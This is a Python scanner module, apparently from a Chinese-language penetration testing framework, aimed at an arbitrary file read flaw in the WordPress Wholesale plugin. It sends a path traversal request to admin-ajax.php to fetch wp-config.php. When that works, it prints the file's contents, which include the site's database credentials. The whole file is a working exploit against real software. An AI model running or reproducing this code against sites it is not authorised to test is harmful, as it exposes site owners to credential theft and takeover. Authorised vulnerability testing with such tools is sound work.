#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Wholesale_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "<?php" in req.text:
                OutPrintInfoSuc("WordPress", f'目标存在Wordpress Wholesale任意文件读取漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("WordPress", f'响应\n{req.text.strip()}')
                else:
                    OutPutFile("wordpress_2022_2633.txt",f'目标存在Wordpress Wholesale任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在Wordpress Wholesale任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("WordPress",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测Wordpress Wholesale任意文件读取漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'Wordpress Wholesale任意文件读取漏洞检测结束')

